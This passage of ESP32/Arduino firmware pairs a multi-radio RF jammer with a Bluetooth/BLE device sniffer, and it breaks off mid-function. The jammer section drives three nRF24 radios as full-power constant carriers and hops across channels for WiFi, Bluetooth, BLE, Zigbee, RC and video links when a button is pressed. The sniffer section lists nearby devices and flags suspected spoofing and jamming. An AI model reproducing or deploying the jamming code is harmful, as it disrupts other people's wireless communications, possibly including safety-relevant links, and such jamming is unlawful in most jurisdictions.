void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = SHREDDY_TEAL;
    Index++;
  }

  for (int i = 3; i < Index; i++) {
    int yPos = i * LINE_HEIGHT + 15;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void checkButtons() {
  unsigned long currentTime = millis();

  if (pcf.digitalRead(BTN_UP) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    jammerToggleRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_RIGHT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_LEFT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested1 = true;
    lastButtonPressTime = currentTime;
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int  previousMode = -1;

  tft.fillRect(0, 39, 240, 320, TFT_BLACK);
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);
  tft.setTextColor(WHITE, DARK_GRAY);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, SHREDDY_TEAL);

    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawRoundRect(0, 19, 240, 16, 4, LIGHT_GRAY);
  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);

  /*
  tft.setCursor(5, 7);
  tft.printf("Mode: %s",
             (currentMode == BLE_MODULE)           ? "BLE" :
             (currentMode == Bluetooth_MODULE)     ? "Bluetooth" :
             (currentMode == WiFi_MODULE)          ? "WIFI" :
             (currentMode == USB_WIRELESS_MODULE)  ? "USB" :
             (currentMode == VIDEO_TX_MODULE)      ? "Video" :
             (currentMode == RC_MODULE)            ? "RC" :
             (currentMode == ZIGBEE_MODULE)        ? "ZIGBEE" :
             (currentMode == NRF24_MODULE)         ? "NRF24" : "Unknown"
            );

  tft.setCursor(100, 7);
  tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
  tft.print("Jammer: ");
  tft.setTextColor(jammerActive ? TFT_RED : TFT_GREEN);
  tft.printf(jammerActive ? "ON" : "OFF");
  */
}

void printModeChange(OperationMode mode) {
  String modeText = "[+] Mode changed to: ";
  switch (mode) {
    case BLE_MODULE:          modeText += "BLE";       break;
    case Bluetooth_MODULE:    modeText += "Bluetooth"; break;
    case WiFi_MODULE:         modeText += "WIFI";      break;
    case USB_WIRELESS_MODULE: modeText += "USB";       break;
    case VIDEO_TX_MODULE:     modeText += "Video";     break;
    case RC_MODULE:           modeText += "RC";        break;
    case ZIGBEE_MODULE:       modeText += "ZIGBEE";    break;
    case NRF24_MODULE:        modeText += "NRF24";     break;
    default: modeText                  += "Unknown";   break;
  }
  Print(modeText, SHREDDY_TEAL, false);
}

void printJammerStatus(bool active) {
  String jammerText = "[!] Jammer ";
  jammerText += active ? "Activated" : "Deactivated";
  Print(jammerText, TFT_RED, false);
}

void checkModeChange() {
  checkButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 8);
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (modeChangeRequested1) {
    modeChangeRequested1 = false;
    currentMode = static_cast<OperationMode>((currentMode == 0) ? 7 : (currentMode - 1));
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();
    printJammerStatus(jammerActive);
  }
}


void prokillSetup() {

  tft.fillScreen(TFT_BLACK);
  tft.setRotation(0);
  
  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  updateTFT();

  Print("===== System Diagnostics =====", TFT_CYAN, false);
  Print("Initializing TFT display...", SHREDDY_TEAL, false);

  initializeRadios();

  Print("[*] Disabling Bluetooth & WiFi...", SHREDDY_TEAL, false);
  Print("[*] Bluetooth & WiFi disabled.", SHREDDY_TEAL, false);

  Print("[*] Initializing PCF8574...", SHREDDY_TEAL, false);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

  Print("[+] System Ready!", TFT_GREEN, true);
}

void prokillLoop() {

  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == WiFi_MODULE) {
      int randomIndex = random(0, sizeof(WiFi_channels) / sizeof(WiFi_channels[0]));
      int channel = WiFi_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == USB_WIRELESS_MODULE) {
      int randomIndex = random(0, sizeof(usbWireless_channels) / sizeof(usbWireless_channels[0]));
      int channel = usbWireless_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == VIDEO_TX_MODULE) {
      int randomIndex = random(0, sizeof(videoTransmitter_channels) / sizeof(videoTransmitter_channels[0]));
      int channel = videoTransmitter_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == RC_MODULE) {
      int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
      int channel = rc_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == ZIGBEE_MODULE) {
      int randomIndex = random(0, sizeof(zigbee_channels) / sizeof(zigbee_channels[0]));
      int channel = zigbee_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == NRF24_MODULE) {
      int randomIndex = random(0, sizeof(nrf24_channels) / sizeof(nrf24_channels[0]));
      int channel = nrf24_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
      }
    }
  }
}


/*
 * 
 * BLE Sniffer
 * 
 * 
*/

namespace BleSniffer {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {170, 210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_eye2,
  bitmap_icon_go_back // Added back icon
};  

#define HEADER_HEIGHT 20
#define STATUS_DOT_SIZE 8
#define LINE_HEIGHT 16
#define MAX_LINES 16
#define MAX_DEVICES 64  // Increased from 32
#define SCAN_INTERVAL 5000
#define MAX_LINE_LENGTH 38
#define BEACON_PREFIX "4c000215"
#define ALERT_FLASH_DURATION 1000
#define SEPARATOR_THICKNESS 1
#define SEPARATOR_MARGIN 5
#define Y_OFFSET 37

struct Config {
  static constexpr int tftRotation = 0;
  static constexpr int serialBaud = 115200;
  static constexpr int bleScanDuration = 5;
  static constexpr int btScanDuration = 5;
  static constexpr int maxPacketCount = 20;
  static constexpr int minRssiThreshold = -20;
  static constexpr int maxNewDevices = 100;  // Increased - 20 was too sensitive
  static constexpr int maxMfgDataLength = 31;
  static constexpr unsigned long deviceTimeout = 30000;
  static constexpr int maxRandomizedMacChanges = 50;  // Increased - randomized MACs are NORMAL (privacy feature)
};

enum class MessageType {
  DEVICE,
  ALERT,
  STATUS
};

// Button definitions for PCF8574
#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5

struct DeviceInfo {
  String mac;
  int rssi = 0;
  int packetCount = 0;
  bool isSuspicious = false;
  String deviceName;
  String serviceUUID;
  String beaconUUID;
  unsigned long firstSeen = 0;  // When device was first detected
  unsigned long lastSeen = 0;   // When device was last seen
  bool display = true;
  bool jammingAlerted = false;
  bool isBLE = true;
  int macChangeCount = 0;
};

struct DisplayLine {
  String text;
  uint16_t color = GREEN;
  uint16_t originalColor = GREEN;
  bool isAlert = false;
  unsigned long flashUntil = 0;
  MessageType type = MessageType::DEVICE;
};

enum class ViewMode {
  LOG_VIEW,      // Original scrolling log
  LIST_VIEW,     // Selectable device list
  DETAIL_VIEW    // Single device details
};

class BluetoothSniffer {
private:
  // Uses global tft from extern declaration (no local instance)
  DeviceInfo devices[MAX_DEVICES];
  DisplayLine displayLines[MAX_LINES];
  int deviceCount = 0;
  int lineNumber = 1;
  int suspiciousCount = 0;
  int newDevicesThisScan = 0;
  int lastDeviceCount = -1;
  int lastSuspiciousCount = -1;
  bool scanning = true;
  bool isBLEScanActive = true;
  unsigned long lastScanTime = 0;
  unsigned long lastFlashToggle = 0;
  bool flashState = false;
  BLEScan* pBLEScan = nullptr;
  BLEAdvertisedDeviceCallbacks* pDeviceCallbacks = nullptr;  // Store for cleanup
  static BluetoothSniffer* snifferInstance;

  // Device selection state
  ViewMode currentView = ViewMode::LIST_VIEW;  // Start in list view
  int selectedDeviceIndex = -1;
  int listScrollOffset = 0;
  int highlightedRow = 0;
  static constexpr int VISIBLE_ROWS = 12;  // How many devices fit on screen
  unsigned long lastListUpdate = 0;

  void initDisplay() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();
  
    setupTouchscreen();
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);
    updateHeader();
    //addLine("Bluetooth Sniffer Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
  }

  void updateHeader() {
    tft.fillRect(0, Y_OFFSET, tft.width(), HEADER_HEIGHT, DARK_GRAY);
    tft.setTextColor(WHITE, DARK_GRAY);
    tft.setCursor(5, Y_OFFSET + 6);
    String status = isBLEScanActive ? "BLE Scanning" : "BT Scanning";
    tft.print(status + " | Dev: " + String(deviceCount) + " Sus: " + String(suspiciousCount));
    uint16_t dotColor = isBLEScanActive ? BLUE : GREEN;
    tft.fillCircle(tft.width() - 10, 46, STATUS_DOT_SIZE / 2, dotColor);
    tft.drawLine(0, 56, 240, 56, ORANGE);
  }

  void updateDisplay() {
    unsigned long now = millis();
    if (now - lastFlashToggle >= 500) {
      flashState = !flashState;
      lastFlashToggle = now;
    }
    tft.fillRect(0, Y_OFFSET + HEADER_HEIGHT, tft.width(), tft.height() - HEADER_HEIGHT, TFT_BLACK);
    for (int i = 0; i < MAX_LINES; i++) {
      if (displayLines[i].text.isEmpty()) continue;
      int y = Y_OFFSET + HEADER_HEIGHT + (i * LINE_HEIGHT);
      uint16_t textColor = displayLines[i].originalColor;
      if (displayLines[i].isAlert && displayLines[i].flashUntil > now) {
        textColor = flashState ? displayLines[i].originalColor : TFT_BLACK;
      }
      tft.setTextColor(textColor, TFT_BLACK);
      tft.setCursor(5, y + 2);
      tft.print(displayLines[i].text);
      if (displayLines[i].originalColor == ORANGE && !displayLines[i].isAlert) {
        tft.drawRect(3, y, tft.width() - 6, LINE_HEIGHT - 2, ORANGE);
      }
      if (i < MAX_LINES - 1 && !displayLines[i + 1].text.isEmpty() &&
          displayLines[i].type != displayLines[i + 1].type) {
        int separatorY = y + LINE_HEIGHT - 1;
        tft.drawFastHLine(SEPARATOR_MARGIN, separatorY, tft.width() - 2 * SEPARATOR_MARGIN, DARK_GRAY);
      }
    }
    if (deviceCount != lastDeviceCount || suspiciousCount != lastSuspiciousCount) {
      updateHeader();
      lastDeviceCount = deviceCount;
      lastSuspiciousCount = suspiciousCount;
    }
    if (deviceCount == 0 && lineNumber == 1) {
      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(5, Y_OFFSET + HEADER_HEIGHT + 10);
      //tft.print("No Devices Detected");
    }
  }

  // ========== DEVICE LIST VIEW ==========
  void drawListView() {
    int startY = Y_OFFSET + HEADER_HEIGHT + 5;
    int rowHeight = 18;

    // Clear list area
    tft.fillRect(0, startY, 240, 320 - startY, TFT_BLACK);

    if (deviceCount == 0) {
      tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
      tft.setCursor(60, startY + 50);
      tft.print("Scanning...");
      return;
    }

    // Draw visible devices
    int visibleCount = min(VISIBLE_ROWS, deviceCount - listScrollOffset);
    for (int i = 0; i < visibleCount; i++) {
      int deviceIdx = i + listScrollOffset;
      if (deviceIdx >= deviceCount) break;

      auto& dev = devices[deviceIdx];
      int y = startY + (i * rowHeight);

      // Highlight selected row
      if (i == highlightedRow) {
        tft.fillRect(0, y, 240, rowHeight, SHREDDY_GUNMETAL);
        tft.drawRect(0, y, 240, rowHeight, SHREDDY_PINK);
      }

      // Device type indicator
      uint16_t typeColor = dev.isBLE ? SHREDDY_BLUE : SHREDDY_GREEN;
      tft.fillCircle(8, y + 9, 4, typeColor);

      // Suspicious indicator
      if (dev.isSuspicious) {
        tft.fillCircle(220, y + 9, 4, SHREDDY_PINK);
      }

      // MAC address (shortened)
      tft.setTextColor(i == highlightedRow ? SHREDDY_PINK : SHREDDY_TEAL, TFT_BLACK);
      tft.setCursor(18, y + 4);
      String macShort = dev.mac.substring(0, 8) + "..." + dev.mac.substring(15);
      tft.print(macShort);

      // RSSI
      tft.setTextColor(GRAY, TFT_BLACK);
      tft.setCursor(150, y + 4);
      tft.print(String(dev.rssi) + "dB");

      // Name (if exists)
      if (!dev.deviceName.isEmpty()) {
        tft.setTextColor(SHREDDY_GREEN, TFT_BLACK);
        tft.setCursor(190, y + 4);
        tft.print(dev.deviceName.substring(0, 4));
      }
    }

    // Scroll indicators
    if (listScrollOffset > 0) {
      tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
      tft.setCursor(115, startY - 3);
      tft.print("^");
    }
    if (listScrollOffset + VISIBLE_ROWS < deviceCount) {
      tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
      tft.setCursor(115, startY + (VISIBLE_ROWS * rowHeight) + 2);
      tft.print("v");
    }

    // Bottom instruction
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, 300);
    tft.print("TAP:Select  UP/DN:Scroll  SEL:Back");
  }

  // ========== DEVICE DETAIL VIEW ==========
  void drawDetailView() {
    if (selectedDeviceIndex < 0 || selectedDeviceIndex >= deviceCount) {
      currentView = ViewMode::LIST_VIEW;
      return;
    }

    auto& dev = devices[selectedDeviceIndex];
    int startY = Y_OFFSET + HEADER_HEIGHT + 5;

    // Clear area
    tft.fillRect(0, startY, 240, 320 - startY, TFT_BLACK);

    // Title bar
    tft.fillRect(0, startY, 240, 20, SHREDDY_GUNMETAL);
    tft.setTextColor(SHREDDY_PINK, SHREDDY_GUNMETAL);
    tft.setCursor(5, startY + 4);
    tft.print(dev.isBLE ? "BLE DEVICE" : "BT CLASSIC");
    if (dev.isSuspicious) {
      tft.setTextColor(SHREDDY_PINK, SHREDDY_GUNMETAL);
      tft.setCursor(180, startY + 4);
      tft.print("[SUS]");
    }

    int y = startY + 28;
    int lineH = 18;

    // MAC Address (full)
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("MAC:");
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(45, y);
    tft.print(dev.mac);
    y += lineH;

    // RSSI
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("RSSI:");
    tft.setTextColor(SHREDDY_GREEN, TFT_BLACK);
    tft.setCursor(50, y);
    tft.print(String(dev.rssi) + " dBm");

    // Signal strength bar
    int barWidth = map(constrain(dev.rssi, -100, -30), -100, -30, 0, 100);
    tft.drawRect(120, y, 102, 12, GRAY);
    if (barWidth > 0) {
      uint16_t barColor = dev.rssi > -50 ? SHREDDY_GREEN : (dev.rssi > -70 ? SHREDDY_TEAL : SHREDDY_PINK);
      tft.fillRect(121, y + 1, barWidth, 10, barColor);
    }
    y += lineH;

    // Device Name
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("Name:");
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(50, y);
    tft.print(dev.deviceName.isEmpty() ? "(none)" : dev.deviceName.substring(0, 20));
    y += lineH;

    // Service UUID (BLE only)
    if (dev.isBLE) {
      tft.setTextColor(GRAY, TFT_BLACK);
      tft.setCursor(5, y);
      tft.print("UUID:");
      tft.setTextColor(SHREDDY_BLUE, TFT_BLACK);
      tft.setCursor(50, y);
      tft.print(dev.serviceUUID.isEmpty() ? "(none)" : dev.serviceUUID.substring(0, 20));
      y += lineH;
    }

    // Packet count
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("Packets:");
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(70, y);
    tft.print(String(dev.packetCount));
    y += lineH;

    // First seen / Last seen
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("First:");
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(50, y);
    tft.print(String((millis() - dev.firstSeen) / 1000) + "s ago");
    y += lineH;

    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("Last:");
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(50, y);
    tft.print(String((millis() - dev.lastSeen) / 1000) + "s ago");
    y += lineH + 10;

    // MAC type
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("MAC Type:");
    tft.setTextColor(isRandomizedMac(dev.mac) ? SHREDDY_PINK : SHREDDY_GREEN, TFT_BLACK);
    tft.setCursor(80, y);
    tft.print(isRandomizedMac(dev.mac) ? "Randomized" : "Static");
    y += lineH + 15;

    // Action buttons hint
    tft.drawRect(5, y, 110, 25, SHREDDY_TEAL);
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(15, y + 7);
    tft.print("COPY MAC");

    tft.drawRect(125, y, 110, 25, SHREDDY_PINK);
    tft.setTextColor(SHREDDY_PINK, TFT_BLACK);
    tft.setCursor(145, y + 7);
    tft.print("TRACK");

    // Bottom instruction
    tft.setTextColor(GRAY, TFT_BLACK);
    tft.setCursor(40, 300);
    tft.print("TAP buttons or SEL:Back");
  }

  void addLine(String text, uint16_t color, bool isAlert = false, MessageType type = MessageType::DEVICE) {
    if (text.length() > MAX_LINE_LENGTH) {
      text = text.substring(0, MAX_LINE_LENGTH - 3) + "...";
    }
    for (int i = MAX_LINES - 1; i > 0; i--) {
      displayLines[i] = displayLines[i - 1];
    }
    displayLines[0].text = text;
    displayLines[0].color = color;
    displayLines[0].originalColor = (type == MessageType::STATUS) ? DARK_GRAY : color;
    displayLines[0].isAlert = isAlert;
    displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
    displayLines[0].type = type;
    updateDisplay();
  }

  void checkSuspiciousActivity(int idx, unsigned long timestamp) {
    auto& device = devices[idx];
    if (device.packetCount > Config::maxPacketCount || (device.isBLE && device.rssi > Config::minRssiThreshold)) {
      if (!device.isSuspicious) {
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display && !device.jammingAlerted) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Jamming Suspected (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
          device.jammingAlerted = true;
        }
      }
    }
    if (device.isBLE && isRandomizedMac(device.mac) && device.macChangeCount > Config::maxRandomizedMacChanges) {
      device.isSuspicious = true;
      suspiciousCount++;
      if (device.display) {
        addLine(String(lineNumber++) + " -> MAC Spoofing Suspected (BLE): " + device.mac + " T:" + String(timestamp),
                ORANGE, true, MessageType::ALERT);
      }
    }
  }

  bool isRandomizedMac(const String& mac) {
    String firstByte = mac.substring(0, 2);
    char* end;
    long value = strtol(firstByte.c_str(), &end, 16);
    return (value & 0xC0) == 0xC0;
  }

  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
    // Guard: Don't add devices if scanning is disabled (during reset/cleanup)
    if (!scanning) return;

    if (deviceCount >= MAX_DEVICES) {
      addLine("Max devices reached!", RED, true, MessageType::ALERT);
      return;
    }
    newDevicesThisScan++;
    auto& device = devices[deviceCount];
    device.isBLE = isBLE;
    if (isBLE) {
      device.mac = bleDevice->getAddress().toString().c_str();
      device.rssi = bleDevice->getRSSI();
      device.deviceName = bleDevice->getName().c_str();
      device.serviceUUID = bleDevice->getServiceUUID().toString().c_str();
      String mfgData = bleDevice->getManufacturerData().c_str();
      checkBeaconSpoofing(device, mfgData, timestamp);
      checkMalformedPacket(device, mfgData, timestamp);
    } else {
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
      device.mac = macStr;
      device.rssi = 0;
    }
    device.packetCount = 1;
    device.firstSeen = timestamp;  // Record when first detected
    device.lastSeen = timestamp;
    device.display = true;
    checkMacSpoofing(device, timestamp);
    checkSuspiciousActivity(deviceCount, timestamp);
    if (device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      String line = String(lineNumber++) + " -> " + device.mac + " (" + String(device.rssi) + " dBm, " + protocol + ")";
      if (isBLE && !device.deviceName.isEmpty()) line += " N:" + device.deviceName.substring(0, 6);
      if (isBLE && !device.serviceUUID.isEmpty()) line += " U:" + device.serviceUUID.substring(0, 8);
      line += " T:" + String(timestamp).substring(0, 6);
      addLine(line, device.isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
    }
    deviceCount++;
    if (newDevicesThisScan > Config::maxNewDevices && device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      addLine(String(lineNumber++) + " -> Flooding Detected (" + protocol + ") T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkBeaconSpoofing(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || !mfgData.startsWith(BEACON_PREFIX)) return;
    device.beaconUUID = mfgData.substring(4, 36);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].beaconUUID == device.beaconUUID && devices[i].mac != device.mac) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          addLine(String(lineNumber++) + " -> Beacon Spoofing (BLE): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void checkMalformedPacket(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || mfgData.length() <= Config::maxMfgDataLength) return;
    device.isSuspicious = true;
    suspiciousCount++;
    if (device.display) {
      addLine(String(lineNumber++) + " -> Malformed Packet (BLE): " + device.mac + " T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkMacSpoofing(DeviceInfo& device, unsigned long timestamp) {
    // Only flag as spoofing if same MAC has DIFFERENT characteristics
    // (not just seeing the same device again - that's normal!)
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].mac == device.mac && i != deviceCount) {
        // Check if characteristics changed suspiciously
        bool nameChanged = !devices[i].deviceName.isEmpty() &&
                           !device.deviceName.isEmpty() &&
                           devices[i].deviceName != device.deviceName;
        bool protocolMismatch = devices[i].isBLE != device.isBLE;  // Same MAC on BLE and BT Classic

        if (nameChanged || protocolMismatch) {
          devices[i].isSuspicious = true;
          device.isSuspicious = true;
          suspiciousCount++;
          if (device.display) {
            String protocol = device.isBLE ? "BLE" : "BT";
            String reason = nameChanged ? "Name Changed" : "Protocol Mismatch";
            addLine(String(lineNumber++) + " -> Spoofing (" + reason + "): " + device.mac,
                    ORANGE, true, MessageType::ALERT);
          }
        }
        return;  // Already exists, just update lastSeen
      }
    }
  }

  void cleanupDevices(unsigned long timestamp) {
    for (int i = 0; i < deviceCount; ) {
      if (timestamp - devices[i].lastSeen > Config::deviceTimeout) {
        if (devices[i].isSuspicious) suspiciousCount--;
        for (int j = i; j < deviceCount - 1; j++) {
          devices[j] = devices[j + 1];
        }
        deviceCount--;
      } else {
        i++;
      }
    }
  }

  void filterByMac(const String& filterMac) {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = (devices[i].mac == filterMac);
    }
    refreshDisplay();
  }

  void filterSuspicious() {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = devices[i].isSuspicious;
    }
    refreshDisplay();
  }

  void refreshDisplay() {
    for (int i = 0; i < MAX_LINES; i++) {
      displayLines[i].text = "";
      displayLines[i].color = GREEN;
      displayLines[i].originalColor = GREEN;
      displayLines[i].isAlert = false;
      displayLines[i].flashUntil = 0;
      displayLines[i].type = MessageType::DEVICE;
    }
    lineNumber = 1;
    tft.fillRect(0, Y_OFFSET + HEADER_HEIGHT, tft.width(), tft.height() - HEADER_HEIGHT, TFT_BLACK);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].display) {
        String protocol = devices[i].isBLE ? "BLE" : "BT";
        String line = String(lineNumber++) + " -> " + devices[i].mac + " (" + String(devices[i].rssi) + " dBm, " + protocol + ")";
        if (devices[i].isBLE && !devices[i].deviceName.isEmpty()) line += " N:" + devices[i].deviceName.substring(0, 6);
        if (devices[i].isBLE && !devices[i].serviceUUID.isEmpty()) line += " U:" + devices[i].serviceUUID.substring(0, 8);
        line += " T:" + String(devices[i].lastSeen).substring(0, 6);
        addLine(line, devices[i].isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
      }
    }
  }

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
    tft.drawLine(0, 36, 240, 36, ORANGE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SHREDDY_TEAL);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      animationState = 2;

      switch (activeIcon) {
        case 0:
            deviceCount = 0;
            suspiciousCount = 0;
            lastDeviceCount = -1;
            lastSuspiciousCount = -1;
            lineNumber = 1;
            for (int i = 0; i < MAX_LINES; i++) {
              displayLines[i].text = "";
              displayLines[i].color = GREEN;
